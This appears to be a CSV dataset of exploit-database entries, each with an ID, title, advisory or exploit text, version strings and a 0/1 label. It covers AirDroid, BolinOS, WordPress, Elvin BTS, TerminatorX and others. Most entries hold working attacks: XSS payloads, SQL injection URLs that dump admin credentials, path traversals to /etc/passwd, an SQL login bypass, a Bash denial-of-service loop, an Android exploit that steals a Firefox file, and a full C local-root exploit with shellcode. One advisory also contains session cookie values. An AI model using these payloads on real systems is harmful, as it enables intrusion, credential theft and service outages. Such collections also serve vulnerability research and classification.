37662,"AirDroid iOS / Android / Win 3.1.3 - Persistent Document Title: =============== Airdroid iOS, Android & Win 3.1.3 - Persistent Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1543   Release Date: ============= 2015-07-20   Vulnerability Laboratory ID (VL-ID): ==================================== 1543   Common Vulnerability Scoring System: ==================================== 3.9   Product & Service Introduction: =============================== AirDroid allows you to access wirelessly and for free on your Android phone or tablet from Windows, Mac or the Internet, and to control it.  (Copy of the Product Homepage: https://www.airdroid.com/de/ )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Core Research Team discovered an application-side input validation web vulnerability in the official SandStudio AirDroid (windows, ios and android) mobile web-application.   Vulnerability Disclosure Timeline: ================================== 2015-07-05: Researcher Notification & Coordination (Hadji Samir) 2015-07-06: Vendor Notification (Security Team) 2015-07-20: Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Sand Studio Product: AirDroid iOS Application (Andoird, Windows, MacOS & Web) 3.1.3   Exploitation Technique: ======================= Remote   Severity Level: =============== Medium   Technical Details & Description: ================================ A persistent input validation web vulnerability has been discovered  in the official SandStudio AirDroid (windows, ios and android) mobile web-application. The vulnerability allows remote attacker or low privilege user accounts to inject malicious codes to the application-side of the affected mobile web-application.  The vulnerability is located in the send messages and the send message with an attached file  module. Remote attackers with low privilege user account are able to upload file name  with malicious strings like ``><script>alert(1).txt. On the arrival inbox occurs the execution of the malicious code that compromises the other target system/device user account. The vulnerability is located on the application-side and the request method to inject is POST.  The security risk of the application-side web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.9. Exploitation of the application-side web vulnerability requires a low privilege web-application user account and low user interaction. Successful exploitation of the vulnerabilities results in persistent phishing mails, session hijacking, persistent external redirect to malicious  sources and application-side manipulation of affected or connected module context.  Request Method(s): 						[+] POST  Vulnerable Module(s): 						[+] Send Message  Vulnerable Parameter(s): 						[+] filename  Affected Module(s): 						[+] Message Inbox   Proof of Concept (PoC): ======================= The vulnerability can be exploited by remote attackers with low privilege application user account and low user interaction (click). For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.  PoC: <span class=""name"">""><""><script>alert(document.cookie).txt< span="""">[PERSISTENT INJECTED SCRIPT CODE]     <span class=""progress-rate"">100%</span>     <a class=""attach-del-icon""></a> </scrip...txt<></span>   --- PoC Session Logs [POST] --- 11:13:00.993[0ms][total 0ms] Status: pending[] POST https://upload.airdroid.com/sms/attachment/?fn=%22%3E%3Cscript%3Ealert(document.cookie).txt&d=&after=0&rtype=0&origin=http%3A%2F%2Fweb.airdroid.com&country=DZ&fname=%22%3E%3Cscript%3Ealert(document.cookie).txt  Load Flags[LOAD_BYPASS_CACHE  ] Content Size[unknown] Mime Type[unknown]    Request Headers:       Host[upload.airdroid.com]       User-Agent[Mozilla/5.0 (X11; Linux i686; rv:39.0) Gecko/20100101 Firefox/39.0]       Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]       Accept-Language[en-US,en;q=0.5]       Accept-Encoding[gzip, deflate]       Content-Type[application/octet-stream]       Referer[http://web.airdroid.com/]       Content-Length[5281]       Origin[http://web.airdroid.com]       Cookie[_SESSION=0b484eb230f27c004a7e990bace6175a416b58ed-%00_TS%3A1438769709%00; _ga=GA1.2.1046706455.1436177514; _gat=1; account_sid=c51d21b583ce76c04c8d4fa5a5c7496e; account_info=aW5mby5kaW1hbmV0QGdtYWlsLmNvbQ%3D%3D%2C63b971b729a756a3c1eb0fec6cccb736%2C9731220%2C59fd7af875fa5434a86e5397c79380d2]    Post Data:       POST_DATA[-PNG 	   Note: We demonstrated the poc by usage of the web-app but the local app is also vulnerable to the same issue!   Solution - Fix & Patch: ======================= The vulnerbaility can be patched by a secure parse and encode of the vulnerable filename value in the send message module with the attach file function.   Security Risk: ============== The security risk of the application-side input validation web vulnerability in the airdroid app is estimated as medium. (CVSS 3.9)   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Hadji Samir [samir@evolution-sec.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed  or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable  in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab  or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for  consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses,  policies, deface websites, hack into databases or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to  electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website  is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact  (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™    --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt","['iOS', 'Win', '3.1.3']",1
23532,Hand-Crafted Software FreeProxy 3.5/3.6 - FreeWeb Directory Traversal source: https://www.securityfocus.com/bid/9388/info  It has been reported that FreeWeb server of FreeProxy may be prone to a directory traversal vulnerability that may allow a remote attacker to access information outside the server root directory. The issue may allow a remote attacker to traverse outside the server root directory by using '../' character sequences.   FreeProxy versions 3.6 and prior are reported to be prone to this issue.  http://www.example.com/../../../../boot.ini%00.html,"['3.5/3.6', '3.6', 'prior']",0
19349,"SGI IRIX 6.4 - 'rmail' Local Privilege Escalation source: https://www.securityfocus.com/bid/460/info  A vulnerability exists in the rmail utility, included by SGI with it's Irix operating system. By failing to sanity check the contents of an environment variable, arbitrary commands may be executed with gid mail. rmail is used with uucp.   The following example is provided:  setenv LOGNAME blah; command-to-execute",['6.4'],1
5309,"BolinOS 4.6.1 - Local File Inclusion / Cross-Site Scripting Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-022   Application:                    BolinOS Versions Affected:              4.6.1 Vendor URL:                     http://www.bolinos.com Bugs:                           Local File Include,Multiple XSS,  System information disclosure Exploits:                       YES Reported:                       13.03.2008 Second report:                  18.03.2008 Vendor response:                none Solution:                       none Date of Public Advisory:        25.03.2008 Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)    Description ***********  BolinOS system has multiple security vulnerabilities:  1. Local File Include 2. Multiple Linked XSS vulnerabilities 3. Multiple XSS in POST 4. System information disclosure    Details *******  1. Local File Include vulnerability found in system/_b/contentFiles/gbincluder.php   Code **** #################################################  $actionpagetoinclude=$_GET[""_bFileToInclude""]; if($actionpagetoinclude!="""" && @file_exists(gBRootPath.""/$actionpagetoinclude"")){    @include(gBRootPath.""/$actionpagetoinclude"");    } else{    echo ""NO FILE"";   }  #################################################  Example:  http://[server]/[installdir]/system/_b/contentFiles/gbincluder.php?_bFileToInclude=../../../../../../../../../../../../../etc/passwd  ---------------------------------------------------------------------   2. Multiple linked XSS vulnerabilities found.  2.1 Linked XSS vulnerability found in page /system/actionspages/_b/contentFiles/gBImageViewer.php  Attacker can inject XSS in GET parameter ""url""  Example:  http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBImageViewer.php?url=<script>alert('DSecRG XSS')</script>   2.2 Linked XSS vulnerability found in page /system/actionspages/_b/contentFiles/gBselectorContents.php  Attacker can inject XSS in GET parameter ""ForEditor"".  Example:  http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBselectorContents.php?ForEditor='><IMG%20SRC=""javascript:alert('DSecRG XSS')"">   2.3 Linked XSS vulnerabilities found in following pages:  /system/actionspages/_b/contentFiles/gBLoginPage.php /system/actionspages/_b/contentFiles/gBPassword.php  Attacker can inject XSS script in URL  Example:  http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBLoginPage.php/""><script>alert('DSecRG XSS')</script> http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBPassword.php/""><script>alert('DSecRG XSS')</script>  ---------------------------------------------------------------------   3. Multiple XSS in POST vulnerabilities, attacker can inject XSS in POST parameter.  3.1 Vulnerability found in script /system/actionspages/_b/contentFiles/gBLoginPage.php  POST parameter ""formlogin"".  Example:  POST /bolinos/system/actionspages/_b/contentFiles/gBLoginPage.php?bAddress=bolinos.sessions HTTP/1.0 Content-Length: 81 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; DS; .NET CLR 2.0.50727)  formlogin=%27><img%20src%3d%22javascript:alert(%27DSecRG%20XSS%27)%22>&BtLogin.x=   3.2 Vulnerability found in page /help/index.php  POST parameter ""bolini_searchengine46Search"".  Example:  bolini_searchengine46Search = '><IMG SRC=javascript:alert(""DSecRG&#x20;XSS"")>  --------------------------------------------------------------------   4. System information disclosure  Non-authentication user can access phpinfo() page.  http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBphpInfo.php    About *****  Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.   Contact:        research [at] dsec [dot] ru                 http://www.dsec.ru (in Russian)  # milw0rm.com [2008-03-25]",['4.6.1'],1
39300,"WordPress Plugin Spider Facebook - 'facebook.php' SQL Injection source: https://www.securityfocus.com/bid/69675/info  Spider Facebook plugin for WordPress is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Spider Facebook 1.0.8 is vulnerable; other versions may also be affected.   http://www.example.com/wordpress/wp-admin/admin.php?page=Spider_Facebook_manage&task=Spider_Facebook_edit&id=1 and 1=2",['1.0.8'],1
35331,"ManageEngine ADSelfService Plus 4.4 - 'EmployeeSearch.cc' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/46331/info   ManageEngine ADSelfService Plus is prone to multiple vulnerabilities, including multiple security-bypass and cross-site scripting vulnerabilities.   Attackers can exploit these issues to bypass certain security restrictions and to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help them steal cookie-based authentication credentials and launch other attacks.   ManageEngine ADSelfService Plus 4.4 is vulnerable; other versions may also be affected.   http://www.example.com/EmployeeSearch.cc?actionId=showList&searchString=alice%22%20onmouseover=%22alert%28%27xss%27%29&parameterName=name&searchType=containshttp://www.example.com/EmployeeSearch.cc?actionId=Search&parameterName=name&searchType=contains&searchString=alice%22+onMouseOver%3D%22javascript%3Aalert%28%27xss%27%29",['4.4'],1
32802,Clipbucket 1.7 - 'dwnld.php' Directory Traversal source: https://www.securityfocus.com/bid/33781/info  ClipBucket is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input data.  Exploiting the issue may allow an attacker to obtain sensitive information that could aid in further attacks.  ClipBucket 1.7 is vulnerable; other versions may also be affected.   http://www.example.com/dwnld.php?file=../../../../etc/passwd,['1.7'],1
38766,"Mozilla Firefox 9.0.1 - Same Origin Policy Security Bypass source: https://www.securityfocus.com/bid/62480/info  Mozilla Firefox is prone to a security-bypass vulnerability.  Attackers can exploit this issue to bypass the same-origin policy and certain access restrictions to access data, or execute arbitrary script code in the browser of an unsuspecting user in the context of another site. This could be used to steal sensitive information or launch other attacks.  Note: This issue was previously discussed in BID 62447 (Mozilla Firefox/Thunderbird/SeaMonkey MFSA 2013-76 through -92 Multiple Vulnerabilities), but has been moved to its own record to better document it.  This issue is fixed in Firefox 24.0.   ckage jp.mbsd.terada.attackfirefox1;    import android.net.Uri;   import android.os.Bundle;   import android.app.Activity;   import android.content.Intent;    public class MainActivity extends Activity {       public final static String MY_PKG =           ""jp.mbsd.terada.attackfirefox1"";        public final static String MY_TMP_DIR =           ""/data/data/"" + MY_PKG + ""/tmp/"";        public final static String HTML_PATH =           MY_TMP_DIR + ""A"" + Math.random() + "".html"";        public final static String TARGET_PKG =           ""org.mozilla.firefox"";        public final static String TARGET_FILE_PATH =           ""/data/data/"" + TARGET_PKG + ""/files/mozilla/profiles.ini"";        public final static String HTML =           ""<u>Wait a few seconds.</u>"" +           ""<script>"" +           ""function doit() {"" +           ""    var xhr = new XMLHttpRequest;"" +           ""    xhr.onload = function() {"" +           ""        alert(xhr.responseText);"" +           ""    };"" +           ""    xhr.open('GET', document.URL);"" +           ""    xhr.send(null);"" +           ""}"" +           ""setTimeout(doit, 8000);"" +           ""</script>"";        @Override       public void onCreate(Bundle savedInstanceState) {           super.onCreate(savedInstanceState);           setContentView(R.layout.activity_main);           doit();       }        public void doit() {           try {               // create a malicious HTML               cmdexec(""mkdir "" + MY_TMP_DIR);               cmdexec(""echo \"""" + HTML + ""\"" > "" + HTML_PATH);               cmdexec(""chmod -R 777 "" + MY_TMP_DIR);                Thread.sleep(1000);                // force Firefox to load the malicious HTML               invokeFirefox(""file://"" + HTML_PATH);                Thread.sleep(4000);                // replace the HTML with a symbolic link to profiles.ini               cmdexec(""rm "" + HTML_PATH);               cmdexec(""ln -s "" + TARGET_FILE_PATH + "" "" + HTML_PATH);           }           catch (Exception e) {}       }        public void invokeFirefox(String url) {           Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));           intent.setClassName(TARGET_PKG, TARGET_PKG + "".App"");           startActivity(intent);       }        public void cmdexec(String cmd) {           try {               String[] tmp = new String[] {""/system/bin/sh"", ""-c"", cmd};               Runtime.getRuntime().exec(tmp);           }           catch (Exception e) {}       }   }",['9.0.1'],1
5988,"plx Ad Trader 3.2 - 'adid' SQL Injection @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ @     plx Ad Trader v3.2  SQL Injection Vulnerability @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @    Author: Hussin X                                   @ @                                                       @ @    Home :  www.tryag.cc/cc                            @ @                                                       @ @    email:  darkangel_g85[at]Yahoo[DoT]com             @ @            hussin.x[at]hotmail[DoT]com                @ @                                                       @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @ @    HomE script : http://plxwebdev.com @ @    DeMo        : http://plxwebdev.com/demos/plxadtrader                               @                                                       @                                                       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ @ @ @  ExPloiT :  www.[target].com/Script/ad.php?s=redir&f=siteurl&adid=-12+UNION+SELECT+concat_ws(0x3a,login,pass)+from+br_admins--     L!VE DEMO :  USER  http://plxwebdev.com/demos/plxadtrader/ad.php?s=redir&f=siteurl&adid=-12+UNION+SELECT+login+from+br_admins--  PASSWORD  http://plxwebdev.com/demos/plxadtrader/ad.php?s=redir&f=siteurl&adid=-12+UNION+SELECT+pass+from+br_admins--   @ @ @ @@@@@@@@@@@@@@@@@@@@@@@( Greetz )@@@@@@@@@@@@@@@@@@@@@@@@ @                                                       @ @ TrYaG.cc / DeViL iRaQ / IRAQ DiveR/ IRAQ_JAGUAR       @ @                                                       @ @          str0ke / FAHD  /Iraqihack / Silic0n          @ @@@@@@@@@@@@@@@@@                       @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@(and All IRAQIs)@@@@@@@@@@@@@@@@@@@@  # milw0rm.com [2008-07-01]","['3.2', 'v3.2']",0
120,"TerminatorX 3.81 - Local Stack Overflow / Local Privilege Escalation /* TerminatorX V. <= 3.81 local root exploit by Li0n7  *  * Typical local stack-based overflow  *  * Bugs discovered by c0wboy from 0x333  *  * Contact Li0n7 voila fr  *  * Usage: ./terminatorX-exp [-r <RET>][-b [-s <STARTING_RET>]]  *  * -r <RET>: no bruteforcing, try to execute shellcode with <RET> as return address  * -b: enables bruteforcing  * -s: bruteforces by using return address from <STARTING_RET> to 0x00000000  *  * Example:  *  *root@li0n7:/tmp/test/exploits# ./terminatorX-exp -b  *  * exploit: terminatorX V. <= 3.81 local root exploit by Li0n7  * discoverer: c0wb0y (www.0x333.org)  * visit us: http://www.ioc.fr.st  * contact me: Li0n7[at]voila[dot]fr  * usage: ./xterminator2 [-r <RET>][-b [-s <STARTING_RET>]]  *  *[+] Starting bruteforcing...  *[+] Testing 0xbffff734...  *terminatorX Release 3.81 - Copyright (C) 1999-2003 by Alexander König   *terminatorX comes with ABSOLUTELY NO WARRANTY - for details read the license.   *...   *[+] Testing 0xbffff66c...   *terminatorX Release 3.81 - Copyright (C) 1999-2003 by Alexander König   *terminatorX comes with ABSOLUTELY NO WARRANTY - for details read the license.   *...  *tX: err: Error parsing terminatorXrc.  *tX: Failed loading terminatorXrc - trying to load old binary rc.   *+ tX_warning: LADSPA_PATH not set. Trying /usr/lib/ladspa:/usr/local/lib/ladspa  ** tX_error: tX: Error: couldn't access directory ""/usr/lib/ladspa"".   *+ tX_warning: Plugin ""Sine Oscillator (Freq:audio, Amp:audio)"" disabled. Not a 1-in/1-out plugin.   *+ tX_warning: Plugin ""Sine Oscillator (Freq:control, Amp:control)"" disabled. Not a 1-in/1-out plugin.   *+ tX_warning: Plugin ""Stereo Amplifier"" disabled. Not a 1-in/1-out plugin.   *+ tX_warning: Plugin ""White Noise Source"" disabled. Not a 1-in/1-out plugin.  *warning: failed to load external entity ""%90%90...%90%901%C0Ph//shh/bin%...%BFl%F6%FF%BF""  *  *(terminatorX:3085): WARNING **: Invalid UTF8 string passed to pango_layout_set_text()   *sh-2.05b# exit *exit *[+] Exited: shell's ret code = 0   *[+] Ret address found: 0xbffff66c  *  */  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/wait.h> #include <sys/types.h> #include <errno.h>  #define BSIZE 200 #define D_START 0xbffff734 #define PATH ""/usr/local/bin/terminatorX"" #define RET 0xbffff69e  char shellcode[]= ""\x31\xc0\x50\x68//sh\x68/bin\x89\xe3""       ""\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"";  char *buffer,*ptr;  void checkme(char *buffer) {       if(!buffer)       {           fprintf(stderr,""[-] Can't allocate memory,exiting...\n"");           exit(0);       }       return; }   void exec_vuln() {       execl(PATH,PATH,""-f"",buffer,NULL); }   int tease() {       pid_t pid;       pid_t wpid;       int status;        pid = fork();        if ( pid == -1 ) {           fprintf(stderr, "" [-] %s: Failed to fork()\n"", strerror(errno));           exit(13);        } else if ( pid == 0 ) {            exec_vuln();        } else {           wpid = wait(&status);          if ( wpid == -1 ) {               fprintf(stderr,""[-] %s: wait()\n"", strerror(errno));              return 1;           } else if ( wpid != pid )               abort();          else {              if ( WIFEXITED(status) ) {                  printf(""[+] Exited: shell's ret code = %d\n"", WEXITSTATUS(status));                 return WEXITSTATUS(status);              } else if ( WIFSIGNALED(status) ) {                  return WTERMSIG(status);             } else {                  fprintf(stderr, ""[-] Stopped.\n"");              }         }       }       return 1; }   int make_string(long ret_addr) {       int i;       long ret,addr,*addr_ptr;        buffer = (char *)malloc(512);       if(!buffer)       {           fprintf(stderr,""[-] Can't allocate memory, exiting...\n"");           exit(-1);       }        ret = ret_addr;        ptr = buffer;        memset(ptr,0x90,BSIZE-strlen(shellcode));       ptr += BSIZE-strlen(shellcode);        for(i=0;i<strlen(shellcode);i++)           *ptr++ = shellcode[i];        addr_ptr = (long *)ptr;       for(i=0;i<20;i++)           *(addr_ptr++) = ret;       ptr = (char *)addr_ptr;       *ptr = 0;       return 0; }   int bruteforce(long start) {       int ret;       long i;        fprintf(stdout,""[+] Starting bruteforcing...\n"");        for(i=start;i<0;i=i-50)       {           fprintf(stdout,""[+] Testing 0x%x...\n"",i);           make_string(i);           ret=tease();           if(ret==0)           {               fprintf(stdout,""[+] Ret address found: 0x%x\n"",i);               break;           }       }        return 0; }  void banner(char *argv0) {       fprintf(stderr,""\n exploit: terminatorX V. <= 3.81 local root exploit by Li0n7\n"");       fprintf(stderr,"" discoverer: c0wb0y (www.0x333.org)\n"");       fprintf(stderr,"" visit us: http://www.ioc.fr.st\n"");       fprintf(stderr,"" contact me: Li0n7[at]voila[dot]fr\n"");       fprintf(stderr,"" usage: %s [-r <RET>][-b [-s <STARTING_RET>]]\n\n"",argv0); }  int main(int argc,char *argv[]) {       char * option_list = ""br:s:"";       int option,brute = 0, opterr = 0;       long ret,start = D_START;        banner(argv[0]);       if (argc < 1) exit(-1);        while((option = getopt(argc,argv,option_list)) != -1)           switch(option)           {               case 'b':                   brute = 1;                   break;               case 'r':                   ret = strtoul(optarg,NULL,0);                   make_string(ret);                   tease();                   exit(0);                   break;               case 's':                   start = strtoul(optarg,NULL,0);                   break;               case '?':                   fprintf(stderr,""[-] option \'%c\' invalid\n"",optopt);                   banner(argv[0]);                   exit(-1);           }        if(brute)           bruteforce(start);        return 0; }   // milw0rm.com [2003-11-13]",['3.81'],1
45947,"DomainMOD 4.11.01 - Custom SSL Fields Cross-Site Scripting # Exploit Title: DomainMOD 4.11.01 - Cross-Site Scripting # Date: 2018-11-22 # Exploit Author: Mohammed Abdul Raheem # Vendor Homepage: domainmod (https://domainmod.org/) # Software Link: domainmod (https://github.com/DomainMod/DomainMod) # Version: v4.09.03 to v4.11.01 # CVE : CVE-2018-19751  # A Stored Cross-site scripting (XSS) was discovered in DomainMod application # versions from v4.09.03 to v4.11.01（https://github.com/domainmod/domainmod/issues/83) # After logging into the Domainmod application panel, browse to the /admin/ssl-fields/add.php page and inject a javascript XSS payload in Display Name, Description & Notes fields   ""><img src=x onerror=alert(""Xss-By-Abdul-Raheem"")>  #POC : attached here https://github.com/domainmod/domainmod/issues/83","['4.11.01', 'v4.09.03', 'v4.11.01（https:github.comdomainmoddomainmodissues83)']",1
40288,"WordPress Core 4.5.3 - Directory Traversal / Denial of Service Path traversal vulnerability in WordPress Core Ajax handlers  Abstract  A path traversal vulnerability was found in the Core Ajax handlers of the WordPress Admin API. This issue can (potentially) be used by an authenticated user (Subscriber) to create a denial of service condition of an affected WordPress site.  Contact  For feedback or questions about this advisory mail us at sumofpwn at securify.nl  The Summer of Pwnage  This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.  OVE ID  OVE-20160712-0036  See also  - CVE-2016-6896 - CVE-2016-6897 - #37490 - Improve capability checks in wp_ajax_update_plugin() and wp_ajax_delete_plugin()  Tested versions  This issue was successfully tested on the WordPress version 4.5.3.  Fix  WordPress version 4.6 mitigates this vulnerability by moving the CSRF check to the top of the affected method(s).  Introduction  WordPress is web software that can be used to create a website, blog, or app. A path traversal vulnerability exists in the Core Ajax handlers of the WordPress Admin API. This issue can (potentially) be used by an authenticated user (Subscriber) to create a denial of service condition of an affected WordPress site.  Details  The path traversal vulnerability exists in the file ajax-actions.php, in particular in the function wp_ajax_update_plugin().   The function first tries to retrieve some version information from the target plugin. After this is done, it checks the user's privileges and it will verify the nonce (to prevent Cross-Site Request Forgery). The code that retrieves the version information from the plugin is vulnerable to path traversal. Since the security checks are done at a later stage, the affected code is reachable by any logged on user, including Subscribers.  Potentially this issue can be used to disclose information, provided that the target file contains a line with Version:. What is more important that it also allows for a denial of service condition as the logged in attacker can use this flaw to read up to 8 KB of data from /dev/random. Doing this repeatedly will deplete the entropy pool, which causes /dev/random to block; blocking the PHP scripts. Using a very simple script, it is possible for an authenticated user (Subscriber) to bring down a WordPress site. It is also possible to trigger this issue via Cross-Site Request Forgery as the nonce check is done too late in this case.  Proof of concept  The following Bash script can be used to trigger the denial of service condition.  #!/bin/bash target=""http://<target>"" username=""subscriber"" password=""password"" cookiejar=$(mktemp)     # login curl --cookie-jar ""$cookiejar"" \    --data ""log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1"" \    ""$target/wp-login.php"" \    >/dev/null 2>&1     # exhaust apache for i in `seq 1 1000`    do       curl --cookie ""$cookiejar"" \       --data ""plugin=../../../../../../../../../../dev/random&action=update-plugin"" \       ""$target/wp-admin/admin-ajax.php"" \       >/dev/null 2>&1 & done     rm ""$cookiejar""","['4.5.3', '4.6']",1
38459,"Request Tracker - 'ShowPending' SQL Injection source: https://www.securityfocus.com/bid/59022/info  Request Tracker is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied input before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  RT 4.0.10 is vulnerable; other versions may also be affected.   POST /Approvals/ HTTP/1.0 Content-Type: application/x-www-form-urlencoded Cookie: RT_SID_example.com.80=7c120854a0726239b379557f024cc1cb Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://www.example.com/Approvals/ Host: 10.10.10.70 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;  Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR  3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E) Content-Length: 120  ShowPending=1%27+and+%27f%27%3D%27f%27%29+--+&ShowResolved=1&ShowRejected=1&ShowDependent=1&CreatedBefore=&CreatedAfter=",['4.0.10'],1
8953,"elvin bts 1.2.0 - Multiple Vulnerabilities ################################################################################################################# [+] Elvin BTS 1.2.0 Multiple Remote VUlnerabilities [+] Discovered By SirGod  [+] www.mortal-team.org #################################################################################################################  - Script Homepage : http://www.elvinbts.org/ - Google Dork : Powered by Elvin Bug Tracking Server.  Elvin BTS suffers from a lot of vunerabilities  1) SQL Injection 2) Local File Inclusion 3) SQL Injection Login Bypass 4) Cross-Site Scripting 5) Cross-Site Request Forgery 6) Source Code Disclosure   ----------------------- 1) SQL Injection -----------------------   - Vulnerable code is everywhere.I will present only 2 PoC's.   a) Vulnerable code in show_bug.php  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- $query_bug = sprintf(""SELECT * FROM "" .$prefix_db. ""_bug WHERE bg_id_pk="" .$_GET['id']. "" AND bg_deleted_dt IS NULL""); ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   - PoC        http://127.0.0.1/[path]/show_bug.php?id=null+union+all+select+1,2,3,4,concat_ws(0x3a,ac_user_vc,ac_pass_vc),6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+eb_profile--    b) Vulnerable code in show_activity.php  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- $query_activity = sprintf(""SELECT * FROM "" .$prefix_db. ""_activity WHERE ay_bugid_fk="" .$_GET['id']. """"); ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   - PoC        http://127.0.0.1/[path]/show_activity.php?id=null+union+all+select+1,2,3,4,concat_ws(0x3a,ac_user_vc,ac_pass_vc),6,7,8+from+eb_profile--   ----------------------- 2) Local File Inclusion -----------------------   - Vulnerable code in page.php   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- $filename = ""pages/"".$_GET['id']; ................................................ if(file_exists($filename)){ include($filename); } else { echo ""<h2>Sorry page cannot be found!</h2>""; } ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   - PoC          http://127.0.0.1/[path]/page.php?id=../../../../../../BOOTSECT.BAK    ----------------------- 3) SQL Injection Login Bypass-----------------------   - Code in login.php ( in login.php is included the vulnerable code)  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- include(LoadElvinModule('login.ei')); ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   - Vulnerable code in inc/login.ei  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- $query_login = sprintf(""SELECT * FROM "" .$prefix_db. ""_profile WHERE ac_user_vc='"" .$_POST['inUser']. ""' AND ac_pass_vc='"" .$_POST['inPass']. ""'""); ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   - PoC   Login as :     Username : 'or''='  Password : 'or''='   ----------------------- 4) Cross-Site Scripting-----------------------   It's more XSS's in the script,but tired to find them all.  - Vulnerable code in show_activity.php  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- <p>Back to bug # <a href=""show_bug.php?id=<?php echo $_GET['id']; ?>""><?php echo $_GET['id']; ?></a></a></p> ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   - PoC      http://127.0.0.1/[path]/show_activity.php?id=<script>alert(document.cookie)</script>    ----------------------- 5) Cross-Site Request Forgery-----------------------   Logout CSRF   - PoC     http://127.0.0.1/[path]/login.php?logout    ----------------------- 6) Source Code Disclosure-----------------------   Go to /inc/ directory.You will se .ei files with php code inside. That files are included and used by the script.   - PoC's      http://127.0.0.1/[path]/inc/login.ei     http://127.0.0.1/[path]/inc/jump_bug.ei     http://127.0.0.1/[path]/inc/create_account.ei  